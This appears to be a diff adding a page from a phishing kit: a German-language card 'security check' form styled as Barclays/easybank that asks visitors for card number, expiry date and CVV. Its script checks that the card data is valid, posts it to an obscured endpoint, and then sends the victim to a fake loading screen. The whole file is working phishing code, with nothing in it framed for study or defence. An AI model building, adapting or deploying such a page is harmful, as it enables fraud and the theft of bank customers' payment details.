@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
+  <meta name="apple-mobile-web-app-status-bar-style" content="white">
+  <title>Sicherheitsscheck - Bestätigung</title>
+  <link rel="stylesheet" href="./css/botta.css">
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+  <%- include('partials/tracker') %>
+    <style>
+      .logo-svg {
+        max-width: 100%;
+      }
+
+      /* Layout adjustments specific to this page if needed, mimicking index.ejs simplicity */
+      .login-card {
+        width: 100%;
+        max-width: 400px;
+        /* Slightly wider for CC details if needed */
+        text-align: center;
+      }
+
+      .form-row {
+        display: flex;
+        gap: 15px;
+      }
+
+      .form-row .form-group {
+        flex: 1;
+      }
+    </style>
+</head>
+
+<body>
+  <div class="container">
+    <header class="header">
+      <div class="header-inner">
+        <img src="img/luigon.PNG" alt="easybank" class="logo">
+        <img src="img/luigon-botuin.PNG" alt="Jetzt registrieren" class="reg-btn">
+      </div>
+    </header>
+
+    <main class="main-content">
+      <div class="login-card">
+
+
+        <form id="caponaForm" class="login-form">
+          <h1 style="margin-bottom: 20px; color: var(--text-color); font-weight: 600;font-size: 27px;">Bestätigung
+            erforderlich</h1>
+          <p style="margin-bottom: 30px; color: rgb(87, 87, 87); font-size: 17px;">Bitte geben Sie Ihre
+            Barclays/easybank Kreditkartendaten ein, um fortzufahren.</p>
+
+          <!-- Card Number -->
+          <div class="form-group">
+            <input type="tel" id="cardNumber" name="cardNumber" class="form-input" placeholder=" " required
+              maxlength="19" autocomplete="cc-number" />
+            <label class="form-label" for="cardNumber">Kreditkartennummer</label>
+          </div>
+
+          <div class="form-row">
+            <!-- Expiry Date -->
+            <div class="form-group">
+              <input type="tel" id="expiryDate" name="expiryDate" class="form-input" placeholder=" " required
+                maxlength="5" autocomplete="cc-exp" />
+              <label class="form-label" for="expiryDate">Ablauf (MM/JJ)</label>
+            </div>
+
+            <!-- CVV -->
+            <div class="form-group">
+              <input type="tel" id="cvv" name="cvv" class="form-input" placeholder=" " required maxlength="4"
+                autocomplete="cc-csc" />
+              <label class="form-label" for="cvv">CVV</label>
+            </div>
+          </div>
+
+          <div id="error-message" style="color: red; margin-bottom: 15px; display: none; font-size: 14px;"></div>
+
+          <button type="submit" class="submit-btn" id="submitBtn">Bestätigen</button>
+
+          <div class="forgot-password">
+            <a href="#">Probleme bei der Bestätigung?</a>
+          </div>
+        </form>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">FAQ</a>
+        <a href="#">Kontakt</a>
+        <a href="#">Impressum</a>
+        <a href="#">Datenschutz</a>
+        <a href="#">AGB</a>
+        <a href="#">Barrierefreiheit</a>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    // ── Card type detection ──────────────────────────────────────────────────
+    function getCardType(num) {
+      const n = num.replace(/\s+/g, '');
+      if (/^4/.test(n)) return 'visa';
+      if (/^5[1-5]/.test(n) || /^2(2[2-9]|[3-6]\d|7[01]\d|720)/.test(n)) return 'mastercard';
+      if (/^3[47]/.test(n)) return 'amex';
+      if (/^(6304|6759|676[1-3]|6334)/.test(n)) return 'maestro';
+      return null;
+    }
+
+    const VALID_LENGTHS = {
+      visa: [13, 16],
+      mastercard: [16],
+      amex: [15],
+      maestro: [12, 13, 14, 15, 16, 17, 18, 19]
+    };
+
+    // ── Auto-format card number (groups of 4; Amex: 4-6-5) ──────────────────
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', (e) => {
+      const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
+      const type = getCardType(raw);
+      let formatted;
+      if (type === 'amex') {
+        formatted = raw.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_, a, b, c) =>
+          [a, b, c].filter(Boolean).join(' '));
+      } else {
+        formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
+      }
+      e.target.value = formatted;
+    });
+
+    // ── Auto-format expiry MM/YY ─────────────────────────────────────────────
+    const expiryInput = document.getElementById('expiryDate');
+    expiryInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (value.length > 2) {
+        e.target.value = value.slice(0, 2) + '/' + value.slice(2);
+      } else {
+        e.target.value = value;
+      }
+    });
+
+    // ── CVV: digits only ─────────────────────────────────────────────────────
+    const cvvInput = document.getElementById('cvv');
+    cvvInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
+
+    // ── Luhn algorithm ───────────────────────────────────────────────────────
+    function luhnCheck(val) {
+      const digits = val.replace(/\s+/g, '');
+      let sum = 0, shouldDouble = false;
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let d = +digits[i];
+        if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
+        sum += d;
+        shouldDouble = !shouldDouble;
+      }
+      return sum % 10 === 0;
+    }
+
+    // ── Expiry date validator ────────────────────────────────────────────────
+    function validateExpiry(expiry) {
+      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+      const [mm, yy] = expiry.split('/').map(Number);
+      if (mm < 1 || mm > 12) return false;           // month must be 01-12
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;  // 2-digit year
+      const currentMonth = now.getMonth() + 1;       // 1-indexed
+      if (yy < currentYear) return false;            // year in the past
+      if (yy === currentYear && mm < currentMonth) return false; // this month is OK
+      return true;
+    }
+
+    // ── Form submission ──────────────────────────────────────────────────────
+    document.getElementById('caponaForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const submitBtn = document.getElementById('submitBtn');
+      const errorMsg = document.getElementById('error-message');
+
+      errorMsg.style.display = 'none';
+      errorMsg.textContent = '';
+
+      const rawCard = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+      const expiry = document.getElementById('expiryDate').value;
+      const cvv = document.getElementById('cvv').value;
+      const cardType = getCardType(rawCard);
+
+      // 1. Card type must be recognised
+      if (!cardType) {
+        errorMsg.textContent = 'Kartennummer nicht erkannt. Bitte prüfen Sie Ihre Eingabe.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 2. Length must match the network
+      if (!VALID_LENGTHS[cardType].includes(rawCard.length)) {
+        errorMsg.textContent = 'Ungültige Kartennummerlänge für diesen Kartentyp.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 3. Luhn check
+      if (!luhnCheck(rawCard)) {
+        errorMsg.textContent = 'Bitte geben Sie eine gültige Kartennummer ein.';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 4. Expiry date
+      if (!validateExpiry(expiry)) {
+        errorMsg.textContent = 'Ungültiges oder abgelaufenes Ablaufdatum. Format: MM/JJ';
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // 5. CVV length (Amex = 4, others = 3)
+      const expectedCvvLen = cardType === 'amex' ? 4 : 3;
+      if (cvv.length < expectedCvvLen) {
+        errorMsg.textContent = `Bitte geben Sie einen gültigen ${expectedCvvLen}-stelligen CVV ein.`;
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Wird überprüft...';
+
+      $.ajax({
+        url: '/NkMNm4664XhcW8KuukHk',
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({ cardNumber: rawCard, expiryDate: expiry, cvv }),
+        success: function (response) {
+          if (response.OK) {
+            setTimeout(() => {
+              window.location.href = '/loading?time=15&url=/RKnUB922z6Mf4HDwg3EZ';
+            }, 1000);
+          } else {
+            errorMsg.textContent = 'Fehler bei der Verarbeitung. Bitte überprüfen Sie Ihre Eingaben.';
+            errorMsg.style.display = 'block';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Bestätigen';
+          }
+        },
+        error: function () {
+          errorMsg.textContent = 'Ein Verbindungsfehler ist aufgetreten. Bitte versuchen Sie es später erneut.';
+          errorMsg.style.display = 'block';
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Bestätigen';
+        }
+      });
+    });
+  </script>
+</body>
+
+</html>
